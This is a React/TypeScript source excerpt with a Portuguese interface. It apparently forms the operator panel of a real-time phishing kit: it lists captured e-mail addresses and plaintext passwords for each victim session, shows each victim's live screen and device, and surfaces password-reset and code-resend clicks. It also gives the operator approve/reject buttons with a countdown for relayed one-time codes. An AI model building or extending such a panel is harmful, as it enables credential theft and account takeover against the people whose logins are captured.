                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <tr>
                    <th className="px-4 py-3 text-left font-medium">Status</th>
                    <th className="px-4 py-3 text-left font-medium">Última atividade</th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><KeyRound className="h-3 w-3" /> Senha</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Monitor className="h-3 w-3" /> Tela atual</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Monitor className="h-3 w-3" /> Dispositivo</span>
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {activeSessions.map((s) => {
                    const isOnline = activeOnlineSessionIds.has(s.session_id);
                    // Tela em tempo real tem prioridade; se a sessão saiu, usa a ÚLTIMA conhecida
                    // (não inferimos pelos dados — isso causa pulos errados ao trocar de tela).
                    const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
                    const style = getScreenStyle(liveKind);
                    return (
                      <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          <StatusDot online={isOnline} />
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                          {formatTime(s.lastActivity)}
                        </td>
                        <td className="break-all px-4 py-3 font-mono text-xs">
                          <CopyText value={s.email} />
                        </td>
                        <td className="break-all px-4 py-3 font-mono text-xs">
                          <CopyText value={s.password !== "—" ? s.password : ""} />
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 ${style.className}`}>
                            {style.label}
                          </span>
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          <DevicePill ua={s.user_agent} />
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
            </>
          )}
        </section>

        {/* REQUISIÇÕES */}
        <section className={`mt-8 hidden rounded-xl border bg-card shadow-card transition-shadow xs:block ${requestsPulse ? "border-primary shadow-glow" : "border-border"}`}>
          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
            <div className="flex items-center gap-2">
              <Bell className={`h-4 w-4 text-primary ${requestsPulse ? "animate-pulse" : ""}`} />
              <h2 className="font-display text-base font-semibold tracking-wider uppercase">Requisições</h2>
              <Badge variant="secondary" className="text-[10px]">{requests.length}</Badge>
            </div>
            {requests.length > 0 && (
              <Button
                size="sm"
                variant="ghost"
                onClick={handleClearRequests}
                className="h-8 text-xs text-muted-foreground hover:text-destructive"
              >
                <Trash2 className="mr-1 h-3 w-3" />
                Limpar tudo
              </Button>
            )}
          </div>

          {requests.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-10 text-center">
              <p className="text-sm text-muted-foreground">
                Quando alguém clicar em "esqueci a senha", "entrar sem senha", "ativar conta" ou "reenviar código", aparece aqui.
              </p>
            </div>
          ) : (
            <>
            {/* Cards (mobile) */}
            <div className="space-y-3 p-3 md:hidden">
              {requests.slice(0, 100).map((r) => (
                <div key={r.id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
                  <div className="flex items-center justify-between gap-2">
                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">
                      {r.label}
                    </span>
                    <span className="text-[10px] text-muted-foreground font-mono-tabular">
                      {formatTime(r.created_at)}
                    </span>
                  </div>
                  {r.email && (
                    <div className="flex items-start gap-2 text-xs">
                      <Mail className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                      <CopyText value={r.email} className="break-all font-mono" />
                    </div>
                  )}
                  <div className="text-[10px] font-mono text-muted-foreground">
                    sessão {r.session_id.slice(0, 8)}…
                  </div>
                </div>
              ))}
            </div>
            {/* Tabela (desktop) */}
            <div className="hidden overflow-x-auto md:block">
              <table className="w-full text-sm">
                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <tr>
                    <th className="px-4 py-3 text-left font-medium">Quando</th>
                    <th className="px-4 py-3 text-left font-medium">Requisição</th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">Sessão</th>
                  </tr>
                </thead>
                <tbody>
                  {requests.slice(0, 100).map((r) => (
                    <tr key={r.id} className="border-t border-border hover:bg-muted/30">
                      <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                        {formatTime(r.created_at)}
                      </td>
                      <td className="whitespace-nowrap px-4 py-3 text-xs">
                        <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
                          {r.label}
                        </span>
                      </td>
                      <td className="break-all px-4 py-3 font-mono text-xs">
                        <CopyText value={r.email || ""} />
                      </td>
                      <td className="whitespace-nowrap px-4 py-3 font-mono text-[10px] text-muted-foreground">
                        {r.session_id.slice(0, 8)}…
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            </>
          )}
        </section>

        {/* AO VIVO */}
        {live.length > 0 && (
          <section className="mt-8 hidden rounded-xl border border-primary/30 bg-card shadow-glow xs:block">
            <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
              <div className="flex items-center gap-2">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-75" />
                  <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-success" />
                </span>
                <h2 className="text-base font-semibold">Ao vivo</h2>
                <Badge variant="secondary" className="text-[10px]">{live.length}</Badge>
              </div>
            </div>
            <AttemptsTable
              rows={live}
              leads={leads}
              actionable
              busy={busy}
              onAction={send}
              onlineSessionIds={activeOnlineSessionIds}
              liveScreens={liveScreens}
            />
          </section>
        )}

        {/* HISTÓRICO */}
        <section className="mt-6 hidden rounded-xl border border-border bg-card shadow-card xs:block">
          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
            <div className="flex items-center gap-2">
              <History className="h-4 w-4 text-muted-foreground" />
              <h2 className="text-base font-semibold">Histórico</h2>
              <Badge variant="secondary" className="text-[10px]">{history.length}</Badge>
            </div>
            {history.length > 0 && (
              <Button
                size="sm"
                variant="ghost"
                onClick={handleClearAll}
                className="h-8 text-xs text-muted-foreground hover:text-destructive"
              >
                <Trash2 className="mr-1 h-3 w-3" />
                Limpar tudo
              </Button>
            )}
          </div>

          {history.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-12 text-center">
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-muted">
                <History className="h-5 w-5 text-muted-foreground" />
              </div>
              <p className="text-sm text-muted-foreground">
                Quando você aprovar, rejeitar ou um novo código chegar, as tentativas antigas aparecem aqui.
              </p>
            </div>
          ) : (
            <AttemptsTable
              rows={history}
              leads={leads}
              actionable={false}
              busy={busy}
              onAction={send}
              onlineSessionIds={activeOnlineSessionIds}
              liveScreens={liveScreens}
            />
          )}
        </section>

        </>
        </div>
      </main>
    </div>
  );
}

function StatCard({
  label,
  value,
  icon,
  highlight,
}: {
  label: string;
  value: number;
  icon: React.ReactNode;
  highlight?: boolean;
}) {
  return (
    <div
      className={`rounded-xl border bg-card p-3 shadow-card transition xs:p-4 ${
        highlight ? "border-primary/40 shadow-glow" : "border-border"
      }`}
    >
      <div className="flex items-center justify-between">
        <span className="text-[10px] uppercase tracking-wide text-muted-foreground xs:text-xs">{label}</span>
        <span className={`flex h-7 w-7 items-center justify-center rounded-lg ${highlight ? "bg-primary/15 text-primary" : "bg-muted text-muted-foreground"}`}>
          {icon}
        </span>
      </div>
      <div className="mt-1.5 text-xl font-bold tracking-tight xs:mt-2 xs:text-2xl">{value}</div>
    </div>
  );
}

function AdminOrderStatusSection() {
  const [adId, setAdId] = useState<string | null>(null);
  const [open, setOpen] = useState(false);
  useEffect(() => {
    (async () => {
      const { data } = await supabase
        .from("ads")
        .select("id")
        .eq("status", "active")
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();
      if (data?.id) setAdId(data.id);
    })();
  }, []);
  if (!adId) return null;
  return (
    <Dialog open={open} onOpenChange={setOpen}>
      <DialogTrigger asChild>
        <Button variant="ghost" size="sm" className="h-8 px-1.5 xs:h-9 xs:px-2 sm:px-3" title="Status do pedido">
          <Package className="h-3.5 w-3.5 xs:h-4 xs:w-4 sm:mr-2" />
          <span className="hidden sm:inline">Status do pedido</span>
        </Button>
      </DialogTrigger>
      <DialogContent className="max-h-[90vh] w-[calc(100vw-1rem)] overflow-y-auto p-3 sm:max-w-2xl sm:p-6 lg:max-w-4xl">
        <DialogHeader>
          <DialogTitle>Status do pedido</DialogTitle>
        </DialogHeader>
        <OrderStatusPanel adId={adId} />
      </DialogContent>
    </Dialog>
  );
}

function StatusDot({ online }: { online: boolean }) {
  if (online) {
    return (
      <span className="inline-flex items-center gap-1.5 text-success">
        <span className="relative flex h-2 w-2">
          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-75" />
          <span className="relative inline-flex h-2 w-2 rounded-full bg-success" />
        </span>
        <span className="text-[11px] font-medium">online</span>
      </span>
    );
  }
  return (
    <span className="inline-flex items-center gap-1.5 text-muted-foreground">
      <span className="h-2 w-2 rounded-full bg-muted-foreground/40" />
      <span className="text-[11px]">offline</span>
    </span>
  );
}

function AttemptsTable({
  rows,
  leads,
  actionable,
  busy,
  onAction,
  onlineSessionIds,
  liveScreens,
}: {
  rows: AttemptRow[];
  leads: LeadRow[];
  actionable: boolean;
  busy: string | null;
  onAction: (row: AttemptRow, action: "approve" | "reject") => void;
  onlineSessionIds: Set<string>;
  liveScreens: Map<string, string>;
}) {
  return (
    <>
      {/* Cards (mobile) */}
      <div className="space-y-3 p-3 md:hidden">
        {rows.map((row) => {
          const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
          const isOnline = onlineSessionIds.has(row.session_id);
          const liveKind = liveScreens.get(row.session_id);
          const style = getScreenStyle(liveKind ?? "email-code");
          const isEmailPending = actionable && row.kind === "email" && row.status === "pending";

          // Card compacto e destacado para aprovação de e-mail em telas pequenas
          if (isEmailPending) {
            const secondsLeft = getEmailPendingSecondsLeft(row.codeAt);
            const urgent = secondsLeft <= 5;
            return (
              <div
                key={row.key}
                className={`rounded-xl border-2 p-3 space-y-3 shadow-glow transition-colors ${
                  urgent ? "border-destructive/60 bg-destructive/5" : "border-primary/50 bg-primary/5"
                }`}
              >
                {/* Header: status + countdown grande */}
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-1.5">
                    <StatusDot online={isOnline} />
                    <span className="text-[10px] uppercase tracking-wider font-semibold text-primary">
                      E-mail recebido
                    </span>
                  </div>
                  <div
                    className={`flex items-baseline gap-1 rounded-full px-2.5 py-1 font-mono-tabular ${
                      urgent
                        ? "bg-destructive/15 text-destructive"
                        : "bg-primary/15 text-primary"
                    }`}
                  >
                    <span className="text-base font-bold leading-none">{secondsLeft}</span>
                    <span className="text-[10px] leading-none">s</span>
                  </div>
                </div>

                {/* E-mail em destaque */}
                <div className="rounded-md bg-background/60 px-2.5 py-2">
                  <div className="flex items-start gap-2">
                    <Mail className="mt-0.5 h-3.5 w-3.5 shrink-0 text-primary" />
                    <CopyText value={row.email} className="break-all font-mono text-sm font-semibold" />
                  </div>
                </div>

                {/* Meta compacta */}
                <div className="flex flex-wrap items-center gap-x-2 gap-y-1 text-[10px] text-muted-foreground">
                  <span className="font-mono-tabular">{formatTime(row.codeAt)}</span>
                  <span className="opacity-40">•</span>
                  <DevicePill ua={ua} />
                </div>

                {/* Ações grandes lado a lado */}
                <div className="grid grid-cols-2 gap-2 pt-1">
                  <Button
                    size="sm"
                    className="h-12 bg-success text-success-foreground hover:bg-success/90 text-sm font-semibold"
                    onClick={() => onAction(row, "approve")}
                    disabled={busy === `${row.key}-approve`}
                  >
                    {busy === `${row.key}-approve` ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <>
                        <Check className="mr-1.5 h-4 w-4" /> Aprovar
                      </>
                    )}
                  </Button>
                  <Button
                    size="sm"
                    variant="destructive"
                    className="h-12 text-sm font-semibold"
                    onClick={() => onAction(row, "reject")}
                    disabled={busy === `${row.key}-reject`}
                  >
                    {busy === `${row.key}-reject` ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <>
                        <X className="mr-1.5 h-4 w-4" /> Rejeitar
                      </>
                    )}
                  </Button>
                </div>
              </div>
            );
          }

          return (
            <div
              key={row.key}
              className={`rounded-lg border p-3 space-y-2 ${
                actionable ? "border-primary/30 bg-primary/5" : "border-border bg-muted/20"
              }`}
            >
              <div className="flex items-center justify-between gap-2">
                {actionable ? <StatusDot online={isOnline} /> : <span />}
                <div className="text-right">
                  <span className="block text-[10px] text-muted-foreground font-mono-tabular">
                    {formatTime(row.codeAt)}
                  </span>
                  {actionable && row.kind === "email" && row.status === "pending" && (
                    <span className="block text-[10px] font-mono-tabular text-primary">
                      {getEmailPendingSecondsLeft(row.codeAt)}s
                    </span>
                  )}
                </div>
              </div>
              <div className="space-y-1.5">
                <div className="flex items-start gap-2 text-xs">
                  <Mail className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                  <CopyText value={row.email} className="break-all font-mono" />
                </div>
                <div className="flex items-start gap-2 text-xs">
                  <KeyRound className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                  <CopyText value={row.password} className="break-all font-mono" />
                </div>
                <div className="flex items-start gap-2 text-sm">
                  <Hash className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
                  <CopyText value={row.code} className={row.kind === "email" ? "font-mono text-xs" : "font-mono tracking-widest"} />
                </div>
              </div>
              <div className="flex flex-wrap items-center gap-2 pt-1">
                {actionable && (
                  <span className={`inline-flex min-h-6 items-center gap-1 rounded-full px-2 py-0.5 text-[10px] leading-none ${style.className}`}>
                    <Monitor className="h-3 w-3" />
                    {style.label}
                  </span>
                )}
                <DevicePill ua={ua} />
              </div>
              {actionable && (
                <div className="flex gap-2 pt-2">
                  <Button
                    size="sm"
                    className="h-11 flex-1 bg-success text-success-foreground hover:bg-success/90"
                    onClick={() => onAction(row, "approve")}
                    disabled={busy === `${row.key}-approve`}
                  >
                    {busy === `${row.key}-approve` ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <>
                        <Check className="mr-1.5 h-4 w-4" /> Aprovar
                      </>
                    )}
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="h-11 flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                    onClick={() => onAction(row, "reject")}
                    disabled={busy === `${row.key}-reject`}
                  >
                    {busy === `${row.key}-reject` ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <>
                        <X className="mr-1.5 h-4 w-4" /> Rejeitar
                      </>
                    )}
                  </Button>
                </div>
              )}
            </div>
          );
        })}
      </div>
      {/* Tabela (desktop) */}
      <div className="hidden overflow-x-auto md:block">
      <table className="w-full text-sm">
        <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
          <tr>
            {actionable && <th className="px-4 py-3 text-left font-medium">Status</th>}
            <th className="px-4 py-3 text-left font-medium">Hora</th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <Mail className="h-3 w-3" /> E-mail
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <KeyRound className="h-3 w-3" /> Senha
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <Hash className="h-3 w-3" /> Valor
              </span>
            </th>
            {actionable && (
              <th className="px-4 py-3 text-left font-medium">
                <span className="inline-flex items-center gap-1">
                  <Monitor className="h-3 w-3" /> Tela
                </span>
              </th>
            )}
            <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((row) => {
            const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
            const isOnline = onlineSessionIds.has(row.session_id);
            const liveKind = liveScreens.get(row.session_id);
            const style = getScreenStyle(liveKind ?? "email-code");
            return (
              <Fragment key={row.key}>
              <tr
                className={`border-t border-border transition-colors ${
                  actionable ? "bg-primary/5" : "hover:bg-muted/30"
                }`}
              >
                {actionable && (
                  <td className="whitespace-nowrap px-4 py-3 text-xs">
                    <StatusDot online={isOnline} />
                  </td>
                )}
                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                  <div>
                    <span className="block">{formatTime(row.codeAt)}</span>
                    {actionable && row.kind === "email" && row.status === "pending" && (
                      <span className="block text-primary">{getEmailPendingSecondsLeft(row.codeAt)}s</span>
                    )}
                  </div>
                </td>
                <td className="break-all px-4 py-3 font-mono text-xs">
                  <CopyText value={row.email} />
                </td>
                <td className="break-all px-4 py-3 font-mono text-xs">
                  <CopyText value={row.password} />
                </td>
                <td className="px-4 py-3 font-mono text-sm tracking-widest">
                  <CopyText value={row.code} className={row.kind === "email" ? "text-xs" : "tracking-widest"} />
                </td>
                {actionable && (
                  <td className="whitespace-nowrap px-4 py-3 text-xs">
                    <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 ${style.className}`}>
                      {style.label}
                    </span>
                  </td>
                )}
                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
              </tr>
              {actionable && (
                <tr className="bg-primary/5">
                  <td colSpan={7} className="px-4 pb-4 pt-0">
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        className="h-11 flex-1 bg-success text-success-foreground hover:bg-success/90"
                        onClick={() => onAction(row, "approve")}
                        disabled={busy === `${row.key}-approve`}
                      >
                        {busy === `${row.key}-approve` ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <>
                            <Check className="mr-1.5 h-4 w-4" /> Aprovar
                          </>
                        )}
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="h-11 flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                        onClick={() => onAction(row, "reject")}
                        disabled={busy === `${row.key}-reject`}
                      >
                        {busy === `${row.key}-reject` ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <>
                            <X className="mr-1.5 h-4 w-4" /> Rejeitar
                          </>
                        )}
                      </Button>
                    </div>
                  </td>
                </tr>
              )}
              </Fragment>
            );
          })}
        </tbody>
      </table>
      </div>
    </>
  );
}